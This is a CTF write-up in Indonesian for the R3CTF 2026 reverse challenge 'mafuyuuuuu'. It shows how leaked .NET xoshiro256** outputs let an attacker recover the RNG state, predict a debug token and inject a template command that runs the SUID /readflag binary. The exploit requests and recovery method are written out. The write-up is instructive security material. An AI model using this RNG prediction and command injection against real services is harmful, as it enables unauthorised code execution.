# mafuyuuuuu

- **CTF:** R3CTF 2026
- **Category:** Reverse
- **Difficulty:** Hard
- **Flag:** `r3ctf{otOme-K@1Bou-de-@soBOu-YO_D0KIdoK1_sHlTal_jaN_Ka_dare_datte_congrats_finding_the_correct_solution0}`

## Ringkasan

Backend membocorkan dua output berurutan dari satu instance `System.Random` lewat endpoint pembuatan post. Instance RNG yang sama juga dipakai untuk memvalidasi token fitur debug pada template engine.

Di .NET 8, implementasi default `System.Random` menggunakan xoshiro256**. State internalnya bisa dipulihkan dari beberapa leak `Random.Next(int.MaxValue)`. Setelah state tersinkron, output berikutnya dijadikan token untuk memanggil `debug(token,/readflag)` dan membaca flag melalui binary SUID `/readflag`.

## Recon

Arsip hanya memberikan binary backend .NET, frontend, dan konfigurasi deployment:

```text
Dockerfile.backend
deploy/PaperTrailDesk.dll
deploy/PaperTrailDesk.runtimeconfig.json
deploy/readflag.c
deploy/flag
```

Konfigurasi container menunjukkan bahwa backend berjalan sebagai `appuser`, sedangkan `/flag` hanya dapat dibaca root:

```dockerfile
RUN chown root:root /flag /readflag \
    && chmod 0400 /flag \
    && chmod 4555 /readflag
```

`/readflag` adalah binary SUID sederhana yang berpindah ke UID/GID 0 lalu mencetak `/flag`:

```c
int main(void) {
    if (setgid(0) != 0 || setuid(0) != 0) {
        return 1;
    }

    FILE *f = fopen("/flag", "r");
    /* ... */
}
```

Jadi target akhirnya jelas: membuat backend menjalankan `/readflag`.

Pemeriksaan string dan IL pada `PaperTrailDesk.dll` memperlihatkan beberapa route penting:

```text
/api/desk/posts
/api/sekai/story-lab/check
/api/sekai/story-lab/render
/healthz
```

Binary juga memuat class dan string berikut:

```text
DebugLeaseService
DebugLeaseToken
ITemplateDebugBridge
MiniTemplate
/bin/bash
DebugDenied<command>
```

Template engine memiliki primitive `debug(token, command)`. Saat token diterima, backend menjalankan command melalui:

```text
/bin/bash -lc <command>
```

## Leak RNG

Request berikut membuat post baru:

```http
POST /api/desk/posts
Content-Type: application/json

{"category":"story","message":"queued"}
```

Remote mengembalikan bentuk seperti ini:

```json
{
  "id": "MjAzNzUwMTM1MA==",
  "csp": "MTk2ODQ2NzU0MA==",
  "lane": "story",
  "body": "queued"
}
```

`id` dan `csp` bukan nilai acak bebas. Keduanya adalah angka desimal yang di-base64:

```text
MjAzNzUwMTM1MA== -> 2037501350
MTk2ODQ2NzU0MA== -> 1968467540
```

Satu request membocorkan dua output berurutan dari:

```csharp
Random.Next(int.MaxValue)
```

RNG ini dibagi dengan `DebugLeaseService`. Token debug yang benar adalah output RNG berikutnya, sehingga dua nilai yang baru dibocorkan tidak bisa langsung direplay.

## Gangguan dari health worker

Backend mempunyai worker health internal. Worker tersebut mulai berjalan beberapa detik setelah startup, kemudian mengonsumsi tiga output RNG setiap lima detik.

Karena satu request post menghasilkan dua leak, health worker hanya mungkin menyisipkan tiga output di antara request. Untuk lima request awal, posisi kandidat gap menjadi:

```text
no gap
sebelum leak ke-3
sebelum leak ke-5
sebelum leak ke-7
sebelum leak ke-9
```

Solver mencoba semua hipotesis tersebut dan memverifikasi state kandidat menggunakan leak ke-10.

## Model `System.Random` .NET 8

State generator terdiri dari empat word 64-bit:

```text
s0, s1, s2, s3
```

Output xoshiro256** dihitung dari `s1`:

```python
raw = rol64(s1 * 5, 7) * 9
```

Transisinya:

```python
t = s1 << 17
s2 ^= s0
s3 ^= s1
s1 ^= s2
s0 ^= s3
s2 ^= t
s3 = rol64(s3, 45)
```

`Random.Next(int.MaxValue)` tidak mengembalikan `raw` langsung. Runtime mengambil 32 bit atas, kemudian melakukan scaling:

```python
product = (raw >> 32) * 0x7fffffff
value = product >> 32
```

Ada rejection kecil ketika 32 bit bawah `product` kurang dari 2.

Satu leak hanya memberi informasi parsial tentang output mentah. Fungsi `inverse_scaled()` mencari semua kandidat `raw >> 32` yang mungkin menghasilkan nilai leak tersebut.

## Memulihkan state

### 1. Membalik output xoshiro secara parsial

Dari kandidat 32 bit atas output, perkalian dengan 5 dan 9 dibalik menggunakan relasi bit dan carry. Hasilnya adalah sekumpulan kandidat untuk bit 20 sampai 56 dari `s1`, total 37 bit per observasi.

Satu observasi menghasilkan sekitar seratus kandidat pola, bukan seluruh ruang 2^37.

### 2. Memanfaatkan transisi linear

Walaupun fungsi output memakai perkalian, transisi state xoshiro hanya terdiri dari XOR, shift, dan rotate. Seluruh transisi dapat ditulis sebagai sistem linear atas GF(2).

Untuk sembilan observasi, solver membangun matriks yang memetakan 256 bit state awal ke sembilan potongan `s1` berukuran 37 bit:

```text
256 state bits -> 9 × 37 observed bits
```

Matriks tersebut memiliki rank 256. Left nullspace-nya menghasilkan 77 persamaan yang wajib dipenuhi oleh kombinasi sembilan kandidat pola.

### 3. Meet-in-the-middle C++

Mencoba seluruh kombinasi kandidat sembilan grup secara langsung terlalu besar. Helper C++ membagi grup menjadi beberapa pasangan:

```text
(0,1), (2,3), (4,5), (6,8), dan grup 7
```

Setiap pasangan direduksi menjadi syndrome XOR. Pencarian kemudian dilakukan dengan bucket, sorting, dan merge untuk menemukan kombinasi yang syndrome totalnya nol.

Setelah indeks kandidat ditemukan, 256 bit state awal diselesaikan dengan eliminasi Gaussian GF(2).

Solver memverifikasi hasil recovery dengan menghitung ulang seluruh sepuluh leak. State hanya diterima jika semuanya cocok dengan hipotesis posisi health gap.

## Sinkronisasi dan eksekusi debug

Recovery awal membutuhkan waktu, jadi state remote sudah bergerak ketika proses selesai. Solver mengambil satu pasangan leak baru lalu mencari pasangan tersebut dalam stream RNG hasil prediksi:

```python
fresh_pair = leak_pair(client)
synchronized = locate_pair(cursor, fresh_pair)
```

Pencarian ini sekaligus menghitung berapa output tersembunyi yang telah dikonsumsi health worker.

Setelah state tepat berada sesudah pasangan leak baru, output berikutnya diprediksi:

```python
predicted, _ = next_int(state_after_pair)
token = base64.b64encode(str(predicted).encode()).decode()
```

Payload akhir dikirim ke story lab:

```http
POST /api/sekai/story-lab/render
Content-Type: application/json

{
  "template": "{{ debug(BASE64_TOKEN,/readflag) }}",
  "user": "mafuyu",
  "variables": {}
}
```

Jika health worker memakai RNG di antara request leak dan request render, token akan salah. Solver tidak memakai state lama secara paksa; ia mengambil pasangan leak baru, melakukan resync, lalu mencoba lagi.

## Solver

Jalankan:

```bash
python3 solve.py http://challenge.ctf2026.r3kapig.com:32767/
```

`solve.py` otomatis:

1. Mengumpulkan lima pasang leak.
2. Meng-compile helper recovery C++ dengan OpenMP.
3. Mencoba seluruh kemungkinan posisi satu health gap.
4. Memulihkan state xoshiro256**.
5. Mengambil leak baru untuk sinkronisasi.
6. Memprediksi token debug berikutnya.
7. Menjalankan `/readflag` melalui template engine.
8. Mengulang proses sinkronisasi jika kalah race dengan health worker.

Output akhirnya:

```text
[+] recovered xoshiro256** state
[*] debug attempt 1: synchronized past ... hidden RNG calls
<FLAG>r3ctf{otOme-K@1Bou-de-@soBOu-YO_D0KIdoK1_sHlTal_jaN_Ka_dare_datte_congrats_finding_the_correct_solution0}</FLAG>
```

## Flag

```text
r3ctf{otOme-K@1Bou-de-@soBOu-YO_D0KIdoK1_sHlTal_jaN_Ka_dare_datte_congrats_finding_the_correct_solution0}
```
